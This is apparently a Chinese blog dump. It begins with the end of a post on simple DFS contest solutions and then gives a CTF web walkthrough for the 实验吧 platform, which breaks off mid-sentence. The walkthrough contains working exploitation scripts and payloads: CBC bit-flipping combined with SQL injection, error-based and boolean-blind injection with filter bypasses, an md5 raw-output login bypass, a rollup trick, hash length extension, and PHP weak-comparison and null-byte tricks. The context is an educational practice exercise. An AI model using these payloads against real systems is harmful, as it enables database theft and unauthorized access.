对一个数，如果是奇数则乘3加1，是偶数则除以2。重复直至变为1，总操作次数记为c。给定区间[i,j]，求区间内最大可能取到的c的值。 说明按照题意，离线dfs即可。 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#define MAX 1000000int sum[MAX + 1], m, n;int dfs(long long k){ if (k &lt;= MAX &amp;&amp; sum[k]) return sum[k]; int ans = 1; if (k % 2) ans += dfs(3 * k + 1); else ans += dfs(k / 2); if (k &lt;= MAX) sum[k] = ans; return ans;}int main(){ int i, j, k, max; sum[1] = 1; for (i = 2; i &lt;= MAX; ++i) sum[i] = dfs(i); while(~scanf(&quot;%d%d&quot;, &amp;i, &amp;j)){ printf(&quot;%d %d &quot;, i, j); if (i &gt; j){int tmp = i; i = j; j = tmp;} max = 0; for (k = i; k &lt;= j; ++k) if (sum[k] &gt; max) max = sum[k]; printf(&quot;%d\\n&quot;, max); } return 0;} 1114 素数环 一个由自然数 1…n (n≤18) 素数环就是如下图所示，环上任意两个节点上数值之和为素数。 1 / 4 2 \\ / 3要求建立一个从1到n的素数环。 说明考虑到数据范围较小，我们先用prime数组存放素数。然后dfs与相邻数之和是否为素数，最后特判头和尾之和的情况。 1234567891011121314151617181920212223242526272829#include&lt;bits/stdc++.h&gt;using namespace std;int n, prime[50] = {0,0,1,1,0,1,0,1,0,0,0,1,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,1,0}, vis[50], a[50] = {1};void dfs(int now){ if (now == n &amp;&amp; prime[a[0]+a[n-1]]) { for (int i = 0; i &lt; n - 1; ++i) printf(&quot;%d &quot;, a[i]); printf(&quot;%d\\n&quot;, a[n-1]); } else for (int i = 2; i &lt;= n; ++i) if (!vis[i] &amp;&amp; prime[i+a[now-1]]) { a[now] = i; vis[i] = 1; dfs(now+1); vis[i] = 0; }}int main(){ cin &gt;&gt; n; dfs(1); return 0;} 1130 n皇后问题 利用回溯法计算n*n棋盘中摆放n个皇后的方案数。 说明规则是两个皇后不能在同一直线/斜线上。注意好if语句的条件以及行列关系。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;cstdio&gt;#include &lt;cmath&gt;using namespace std;int n, cnt, pos[10];bool ok(int row){ for (int i = 0; i &lt; row; ++i) if((pos[row] == pos[i]) || (abs(row-i) == abs(pos[row]-pos[i]))) return false; return true;}void queen(int row){ int col; if (row == n) ++cnt; else for (col = 0; col &lt; n; ++col){ pos[row] = col; if (ok(row)) queen(row+1); }}int main(){ int t; while(~scanf(&quot;%d&quot;, &amp;t)){ while(t--){ cnt = 0; scanf(&quot;%d&quot;, &amp;n); queen(0); printf(&quot;%d\\n&quot;, cnt); } } return 0;} 2457 Expressions 给出后缀表达式，调换次序使得用队列计算所得结果与用栈计算相同。其中小写字母是操作数，大写字母是运算符。如： 12345678Input:2xyPzwIMabcABdefgCDEFOutput:wzyxIPMgfCecbDdAaEBF 说明从后往前读，遇到操作数就存入数组，遇到运算符就继续dfs两次（对应这一运算符的两个操作数）。最后倒序输出数组。 12345678910111213141516171819202122232425262728293031#include &lt;bits/stdc++.h&gt;using namespace std;string s;vector&lt;string&gt; v;int pos;void dfs(int d){ if (pos &lt; 0) return; v[d] += s[pos--]; if (islower(s[pos+1])) return; dfs(d+1); dfs(d+1);}int main(){ int t; cin &gt;&gt; t; while (t--) { cin &gt;&gt; s; v.assign(s.size(), &quot;&quot;); pos = s.size()-1; dfs(0); for (vector&lt;string&gt;::reverse_iterator it = v.rbegin(); it != v.rend(); ++it) cout &lt;&lt; *it; cout &lt;&lt; endl; } return 0;} 2856 仰望星空 用邻接矩阵的方式给出图，求图中八连通块个数。 说明各大OJ上都有的经典dfs入门题。一种类似模板的写法（稍加改动可以求四连通块、最大连通块、次大连通块等等）：遍历所有不为空的点，向四个方向dfs并把走过的地点标记为空。dfs次数即为连通块个数。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;cstdio&gt;int row, col, a[1005][85];void dfs(int x, int y){ a[x][y] = 0; for (int dx = -1; dx &lt;= 1; ++dx) for (int dy = -1; dy &lt;= 1; ++dy) { int nx = x + dx, ny = y + dy; if (0 &lt;= nx &amp;&amp; nx &lt; row &amp;&amp; 0 &lt;= ny &amp;&amp; ny &lt;= col &amp;&amp; a[nx][ny]) dfs(nx, ny); }}int main(void){ char tmp; int i, j; while(~scanf(&quot;%d%d\\n&quot;, &amp;col, &amp;row)){ int cnt = 0; for (i = 0; i &lt; row; ++i){ for (j = 0; j &lt; col; ++j){ scanf(&quot;%c&quot;, &amp;tmp); if (tmp == '*') a[i][j] = 1; } getchar(); } for (i = 0; i &lt; row; ++i) for (j = 0; j &lt; col; ++j) if (a[i][j]){ dfs(i, j); ++cnt; } printf(&quot;%d\\n&quot;, cnt); } return 0;} 2859 表达式的个数 给定123456789，在数字中添加+,-，或者什么都不加，会得到一个表达式，当然你肯定会算这个表达式的值。然后如果给你这个表达式的值，你会求有多少个不同的表达式能够得到这个值呢？ 说明由于本题数字特殊，可以用数字本身来移动要dfs的位置。位置确定后对加号减号分别dfs。由于需要加在数字中，所以减号不能加在开头。 12345678910111213141516171819202122232425262728#include &lt;cstdio&gt;#include &lt;map&gt;using namespace std;map&lt;int, int&gt; ans;typedef long long ll;void dfs(ll sum, int cnt){ if (cnt &gt; 9){ ++ans[sum]; return; } ll ret = 0; for (int i = cnt; i &lt;= 9; ++i){ ret = ret * 10 + i; dfs(sum + ret, i + 1); if (cnt &gt; 1) dfs(sum - ret, i + 1); }}int main(void){ int n; dfs(0, 1); while(~scanf(&quot;%d&quot;, &amp;n)) printf(&quot;%d\\n&quot;, ans[n]); return 0;} 2912 放书 在书架上放有编号为1,2,…,n的n本书。现将n本书全部取下然后再放回去，当放回去时要求每本书都不能放在原来的位置上。例如n=3时：原来位置为：1,2,3。放回去时只能为：3,1,2或2,3,1这两种。对于每一个n，求满足上面的条件的放法有多少？对于每组测试数据，如果n&lt;8，输出每种放法（每种放法占一行，放法按照字典序从小到大排列），如果n&gt;=8，只需要输出放法总数。 说明如果只需要输出放法总数，那么可以直接套用错排公式D(n)=(n-1)[D(n-2)+D(n-1)]或者D(n)=[n!/e+0.5]。不过本题对于n&lt;8的情况需要输出具体方法，所以依然得靠dfs来实现。 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;bits/stdc++.h&gt;using namespace std;int v[11], a[11], n, cnt;void dfs(int d){ if (d == n+1) { if (n &lt; 8) { for (int i = 1; i &lt;= n; ++i) cout &lt;&lt; a[i]; cout &lt;&lt; endl; }else ++cnt; return; } for (int i = 1; i &lt;= n; ++i) { if (!v[i]) { v[i] = 1; if (i != d) { if (n &lt; 8) a[d] = i; dfs(d+1); } v[i] = 0; } }}int main(){ int t; cin &gt;&gt; t; while (t--) { cin &gt;&gt; n; cnt = 0; memset(v, 0, sizeof(v)); dfs(1); if (n &gt;= 8) cout &lt;&lt; cnt &lt;&lt; endl; } return 0;} 3279 爱狗狗的两个dalao n只重量为w1...wn的狗装入载重为M的缆车，求最少需要多少缆车。1&lt;=n&lt;=181&lt;=M&lt;=1e9 说明由于M较大，难以用上背包dp，只能搜索来做。 123456789101112131415161718192021222324252627282930#include&lt;bits/stdc++.h&gt;using namespace std;const int maxn = 20;int w[maxn], dp[maxn], n, m, ans;bool dfs(int x){ if (x &gt; n) return 1; for (int i = 1; i &lt;= x &amp;&amp; i &lt;= ans; ++i) if (dp[i] + w[x] &lt;= m) { dp[i] += w[x]; if(dfs(x+1)) return 1; dp[i] -= w[x]; } return 0;}int main(){ cin &gt;&gt; n &gt;&gt; m; for (int i = 1; i &lt;= n; ++i) cin &gt;&gt; w[i]; sort(w+1, w+n+1, greater&lt;int&gt;()); for (ans = 1; ans &lt;= n; ++ans) { memset(dp, 0, sizeof(dp)); if (dfs(1)) break; } cout &lt;&lt; ans &lt;&lt; endl; return 0;}","link":"/post/SimpleDFS/"},{"title":"实验吧 Web 练习","text":"实验吧的Web题总体比Bugku难一些，主要难度在于几道注入题。 简单的登录题非常不友好的第一题。。 随便输入id发送并抓包，在请求包中的cookie中发现iv和cipher，可以确定是对称密码题。。响应头中有个提示test.php，访问得到一大段代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475define(&quot;SECRET_KEY&quot;, '***********');define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);error_reporting(0);include('conn.php');function sqliCheck($str){ if(preg_match(&quot;/\\\\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str)){ return 1; } return 0;}function get_random_iv(){ $random_iv=''; for($i=0;$i&lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv;}function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));}function show_homepage(){ global $link; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){ $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode('&quot;.base64_encode($plain).&quot;') can't unserialize&lt;/p&gt;&quot;); $sql=&quot;select * from users limit &quot;.$info['id'].&quot;,0&quot;; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo '&lt;h1&gt;&lt;center&gt;Hello!'.$rows['username'].'&lt;/center&gt;&lt;/h1&gt;'; } else{ echo '&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'; } }else{ die(&quot;ERROR!&quot;); } }}if(isset($_POST['id'])){ $id = (string)$_POST['id']; if(sqliCheck($id)) die(&quot;&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;); $info = array('id'=&gt;$id); login($info); echo '&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;';}else{ if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE['cipher'])){ show_homepage(); }else{ echo '&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt; &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;input id to login&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\\'\\'&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; }} 首先会对提交的参数id进行过滤防止SQL注入，随后会随机生成一个iv，并根据序列化后的id生成明文并加密，加密方式为aes-128-cbc。容易想到CBC字节翻转攻击。iv和cipher这里都经过了base64编码。 如果没有提交参数id，则执行与上述过程相反的解密过程得到明文。如果得到的明文无法反序列化，将直接返回其base64；否则进行sql查询： 1select * from users limit ?,0 这里的问号显然就是注入点了。尝试构造： 1select * from users limit 1#,0 但是#和--两种注释符被过滤了，考虑使用%00。先提交： 1id=1;%00 得到iv和cipher，然后设置到cookie里并去掉参数id再次提交，显示Hello!rootzz，说明注入成功。 这同时也说明，我们可以通过修改iv和cipher控制id，而iv和cipher是没有过滤的，所以可以成功绕过id的过滤机制。具体如何修改，也就是CBC字节翻转攻击的具体过程可以参考我的这篇博客中的最后一题。 例如，我们提交id=12，序列化后分组如下： 12Block 0: a:1:{s:2:&quot;id&quot;;s:Block 1: 2:&quot;12&quot;;} 可以看到，我们翻转第0组的第4字节（从0开始计数），即可控制id=12中的2了。再比如，我们提交id=0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);（显然这里我们可以用join替换逗号，并且想把2换成u来绕过检测），序列化后分组如下： 123456Block 0: a:1:{s:2:&quot;id&quot;;s:Block 1: 70:&quot;0 2nion seleBlock 2: ct * from ((seleBlock 3: ct 1)a join (selBlock 4: ect 2)b join (seBlock 5: lect 3)c); 这里要翻转的变成了第6字节，而如果payload长度大于等于100，则需要翻转第7字节了。 此外，需要注意在payload末尾添加%00。如果直接添加可能会被二次URL编码，因此可以用chr(0)来添加。完整脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import base64import urllibimport requestsimport redef login(payload, i, old, new): url = r'http://ctf5.shiyanbar.com/web/jiandan/index.php' data = {'id': payload} r = requests.post(url=url, data=data) sc = r.headers['Set-Cookie'] cipher = re.findall(r'cipher=(.*)', sc)[0] iv = re.findall(r'iv=(.*),', sc)[0] # print(cipher) # print(iv) cd = base64.b64decode(urllib.parse.unquote(cipher)) ivd = base64.b64decode(urllib.parse.unquote(iv)) ch = bytes([cd[i] ^ ord(new) ^ ord(old)]) cd = cd[:i] + ch + cd[i+1:] cnew = urllib.parse.quote(base64.b64encode(cd)) # print(cnew) cookie0 = {'iv': iv, 'cipher': cnew} r = requests.post(url=url, cookies=cookie0) plain = re.findall(r&quot;base64_decode\\('(.*)'\\)&quot;, r.text)[0] pd = base64.b64decode(plain) block0 = 'a:1:{s:2:&quot;id&quot;;s:' for i in range(16): ch = bytes([ivd[i] ^ pd[i] ^ ord(block0[i])]) # Using bytes([int]) here is important ivd = ivd[:i] + ch + ivd[i+1:] ivnew = urllib.parse.quote(base64.b64encode(ivd)) # print(ivnew) cookie1 = {'iv': ivnew, 'cipher': cnew} r = requests.post(url=url, cookies=cookie1) print(r.text)# login('12', 4, '#', '2')# login('0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);' + chr(0), 6, '2', 'u')login('0 2nion select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);' + chr(0), 7, '2', 'u')# users, you_wantlogin('0 2nion select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &quot;you_want&quot;)b join (select 3)c);' + chr(0), 7, '2', 'u')# valuelogin('0 2nion select * from ((select 1)a join (select value from you_want)b join (select 3)c);' + chr(0), 6, '2', 'u') 忘了提及的一点是，过滤了等号，可以通过regexp绕过。 这题放在Web第一题实在是太劝退了。 后台登录F12找到： 123456789$password=$_POST['password'];$sql = &quot;SELECT * FROM admin WHERE username = 'admin' and password = '&quot;.md5($password,true).&quot;'&quot;;$result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } 这里比较有意思的是在SQL注入中引入了哈希函数。其中md5($password, true)返回一个字符串。 因此我们需要构造一个字符串，使得其md5值由16进制转为字符串后，包含'or'num（num为任意数字），这样就可以组成SQL语句： 1and password = ''or'num' 例如，对于字符串ffifdyop，其md5值为276f722736c95d99e921722cf9ed621c，对应字符串开头为'or'6，因此SQL语句执行结果为true，成功登录。 加了料的报错注入这题比较有趣的是，username中过滤了()，而password中过滤了很多报错注入用的函数名。因此可以考虑将两者拼接，在username中使用函数但把()移动到password里，最后注释掉中间的SQL语句。此外，password还过滤了=，用双重否定绕过即可。 1234567891011username=' and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) or '1# XPATH syntax error: '~error_based_hpf~'username=' and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema&lt;&gt;'error_based_hpf')),0x7e),1) or '1# XPATH syntax error: '~ffll44jj,users~'username=' and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where !(table_name&lt;&gt;'ffll44jj')),0x7e),1) or '1# XPATH syntax error: '~value~'username=' and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or '1# XPATH syntax error: '~flag{err0r_b4sed_sqli_+_hpf}~' 另外，本题也可以用exp和extractvalue函数。 认真一点！过滤了and，union，空格，逗号等等，or需要双写绕过。之后进行布尔盲注。爆数据库名长度： 123456789101112import requestssuccess = 'You are in'url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'for i in range(1, 30): data = {'id':&quot;0'oorr(length(database())=%s)oorr'0&quot; % i} print(data) r = requests.post(url, data=data) if success in r.text: print('Finished, len = %s' % i) break 得到数据库名长度为18。爆数据库名： 1234567891011121314151617import requestsimport stringsuccess = 'You are in'url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'chrset = string.digits + string.ascii_lowercase + '_!~'db = ''for i in range(1, 19): for j in chrset: data = {'id':&quot;0'oorr(mid(database()from(%s)foorr(1))='%s')oorr'0&quot; % (i,j)} print(data) r = requests.post(url, data=data) if success in r.text: db += j print(db) break 得到数据库名ctf_sql_bool_blind。爆表名长度： 1234567891011121314151617import requestsimport stringsuccess = 'You are in'url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'chrset = string.digits + string.ascii_lowercase + '_!~'i = 1while True: val = &quot;0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='')oorr'0&quot; % i data = {'id': val.replace(' ', chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: print('Finished, len = %s' % i) break i += 1 得到所有表名连接起来后，包含分隔符@的总长为10。爆表名： 123456789101112131415161718import requestsimport stringsuccess = 'You are in'url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'chrset = string.digits + string.ascii_lowercase + '_!~@'table = ''for i in range(1, 12): for j in chrset: val = &quot;0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='%s')oorr'0&quot; % (i, j) data = {'id': val.replace(' ', chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: table += j print(table) break 得到表名fiag和users，显然前者是我们需要的。用同样的方法爆列名长度和列名fl$4g。最后爆flag内容的长度： 1234567891011121314151617import requestsimport stringsuccess = 'You are in'url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'chrset = string.digits + string.ascii_lowercase + r'_~=+-*/{\\}?!:@#$%&amp;()[],.'i = 1while True: val = &quot;0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='')oorr'0&quot; % i data = {'id': val.replace(' ', chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: print('Finished, len = %s' % i) break i += 1 得长度为13，爆flag内容： 123456789101112131415161718import requestsimport stringsuccess = 'You are in'url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'chrset = string.digits + string.ascii_lowercase + r'_~=+-*/{\\}?!:@#$%&amp;()[],.'flag = ''for i in range(1, 14): for j in chrset: val = &quot;0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='%s')oorr'0&quot; % (i, j) data = {'id': val.replace(' ', chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: flag += j print(flag) break 得到flag{haha~you，很明显并不完整。将数字改大后再跑一次，得到flag{haha~you-win}----，注意到右花括号后面是若干个-，应该忽略。提交后发现答案错误。 这时候就需要考虑右花括号后面全都是-的原因了。我们构造的payload，简化后写出来就是： 1&quot;0' or (select mid(fl$4g from(i) for(1)) from fiag) = '-' or '0 其中i是数字，表示fl$4g的第i个字符。当显示You are in时停止，也就是说此时，下面这个值为True： 1(select mid(fl$4g from(i) for(1)) from fiag) = '-' 当i大于等于20时，显然此时fl$4g这一列的对应内容已经为空了，但是却依然能等于-。这说明服务端通过某种方式将空格转义成了-。因此真正的flag应该进行反转义，得到flag{haha~you win!}。 你真的会PHP吗？响应头中有提示6c525af4059b4fe7d8c33a.txt，得到代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?php$info = &quot;&quot;;$req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false);error_reporting(0);if(!isset($_POST['number'])){ header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;); die(&quot;have a fun!!&quot;);}foreach([$_POST] as $global_var) { foreach($global_var as $key =&gt; $value) { $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); }}function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true;}if(is_numeric($_REQUEST['number'])){ $info=&quot;sorry, you cann't input a number!&quot;;}elseif($req['number']!=strval(intval($req['number']))){ $info = &quot;number must be equal to it's integer!! &quot;;}else{ $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2){ $info=&quot;no, this is not a palindrome number!&quot;; }else{ if(is_palindrome_number($req[&quot;number&quot;])){ $info = &quot;nice! {$value1} is a palindrome number!&quot;; }else{ $info=$flag; } }}echo $info; 随后就是源码审计了，number不能为空且需要绕过is_numeric，同时还不能是回文数，但是将这个数前后颠倒得到的数值应等于它本身。 在32位系统上运行的PHP会把大于2147483647的数值认为是等于2147483647的，因此2147483647前后颠倒，对PHP来说其数值等于它本身。最后用%00绕过is_numeric即可，payload：2147483647%00。 登陆一下好吗？？能过滤的都过滤了，利用万能密码'='。原理： 1where username = ''='' and password = ''='' 其中username=''结果为false，这和空字符串被认为是相等的。 因缺斯汀的绕过参考博客，包含关于rollup的生动阐释 F12发现source.txt： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) { echo '&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;input type=&quot;submit&quot; /&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;/form&gt;'.&quot;&lt;br/&gt;&quot;; echo '&lt;!--source: source.txt--&gt;'.&quot;&lt;br/&gt;&quot;; die;}function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){ print &quot;姘村彲杞借垷锛屼害鍙禌鑹囷紒&quot;; exit(); }}$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)&quot;;foreach($_POST as $key=&gt;$value){ AttackFilter($key,$value,$filter);}$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con){ die('Could not connect: ' . mysql_error());}$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = '{$_POST['uname']}'&quot;;$query = mysql_query($sql);if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print &quot;CTF{XXXXXX}&quot;; }else{ print &quot;浜﹀彲璧涜墖锛�&quot;; }}else{ print &quot;涓€棰楄禌鑹囷紒&quot;;}mysql_close($con);?&gt; 可以看到过滤了很多注入关键字以及数组绕过等姿势，随后根据用户输入的uname去查询数据库中的pwd，然后和用户POST的pwd比较，一致则通过。注意到这里也是一个弱等号，因此可以考虑空值绕过。还要注意查询输出的结果必须只有一行。 先查看表里一共有几行数据： 1231' or 1 limit 1 offset 0#1' or 1 limit 1 offset 1#1' or 1 limit 1 offset 2# 前两条都返回浜﹀彲璧涜墖锛�，而第三条返回涓€棰楄禌鑹囷紒（这里的乱码是因为编码问题，懒得转换了），因此表里一共只有两条数据。那么怎么插入一条新的数据，使得其中的pwd为NULL呢？ 我们可以利用rollup统计功能实现。构造payload： 11' or 1 group by pwd with rollup limit 1 offset 2# 注意这里的顺序。先group by pwd with rollup插入一条pwd为NULL的统计数据，然后limit 1 offset 2取最新的这一条数据。此时，由于我们POST的pwd也是空，因此通过验证。 简单的sql注入之3/2/1第三题sqlmap报错注入。 第二题还是sqlmap，不过由于过滤空格（和右括号）需要--tamper=space2comment。 不知道为什么第一题似乎和第二题一样。 天下武功唯快不破1234567891011import requestsimport base64url = 'http://ctf5.shiyanbar.com/web/10/10.php'response = requests.get(url)flag = base64.b64decode(response.headers['FLAG']).decode().split(':')[1]data = {'key': flag}res = requests.post(url=url, data=data)print(res.text) 让我进去抓包发现cookie中存在source=0，改为1即可查看源码： 12345678910111213141516171819202122232425262728293031$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don't match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here }} 可以看到，我们需要设置cookie中的getmein为secret||username||password的MD5值，其中username为admin，password不能为admin，且secret未知，但长度为15字节。 我们还知道，数据包中的sample-hash的值就是secret||'admin'||'admin'的MD5值，而这个值是已知的。因此，这显然是哈希长度扩展攻击的模板题。参考哈希长度扩展攻击。具体命令： 1./hash_extender --data admin --secret 20 --append append --signature 571580b26c65f306376d4f64e53cb5c7 --format md5 注意这里secret长度为题目给出的15加上admin的长度5，结果： 1234Type: md5Secret length: 20New signature: 83f2684d54049c211e191f27902caaafNew string: 61646d696e80000000000000000000000000000000000000000000000000000000000000c800000000000000617070656e64 因此在cookie中设置getmein=83f2684d54049c211e191f27902caaaf，POST数据为： 1username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00append 发包后得到flag。 拐弯抹角仔细读它给的注释，可以想到index.php/index.php的方式。 Forms抓包发现存在showsource参数，改成1就能看到源码，PIN码被写死在代码里了。 天网管理系统F12看到登录判断代码，是需要用户名md5值为0，任意选一个md5以0e开头的字符串就会被当作是0处理。登录后得到一个url，访问得到： 123456$unserialize_str = $_POST['password'];$data_unserialize = unserialize($unserialize_str);if($data_unserialize['user'] == '???' &amp;&amp; $data_unserialize['pass']=='???'){ print_r($flag);} 得到关于password的提示，这里利用弱等于漏洞，直接让user和pass都为true即可。payload: 1username=admin&amp;password=a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;} 忘记密码了随便填个邮箱地址，在源代码中发现这样两行： 12&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt; 第二行的vim一般指Vim编辑器，容易联想到它产生的备份文件.swp，可能在网站目录下存在这类文件。而第一行的邮箱显然就是我们需要的管理员邮箱了。 此外还能得到提示：下一步跳转到step2.php，接收一个email参数和一个check参数。如果随意填写check参数则会显示check error然后返回step1.php。 抓包访问step2.php，查看源码，注意到它会提交请求到submit.php，而如果直接访问则会得到you are not an admin。因此考虑获取三个页面中某一个的源码，尝试.step1.php.swp和.step2.php.swp无果，但是存在.submit.php.swp。核心代码： 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = &quot;SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'&quot;; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0){ echo $flag; }else{ echo &quot;失败了呀&quot;; }} 这里要求token长度为10且值等于0，可以直接令其等于0000000000（0e绕过应该也行）。最终payload： 1http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0000000000 Once More首先拿到源代码： 1234567891011121314151617181920212223&lt;?phpif (isset ($_GET['password'])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET['password']) === FALSE) { echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; } else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); } } else { echo '&lt;p&gt;Invalid password&lt;/p&gt;'; }}?&gt; 代码先检查传入的密码是否是由字母和数字构成，然后限制了长度小于8但值大于9999999，最后密码中需要含有*-*。 题目提示ereg函数存在漏洞，猜测这里是利用%00截断，构造password=1e9%00*-*即可绕过。需要注意的是，如果直接在输入框输入，%00会被二次URL编码。 GuessNextSession这题属于错误出题的典范，直接点Guess就可以出答案。。。为什么呢？还是先看源码： 1234567891011&lt;?phpsession_start();if (isset 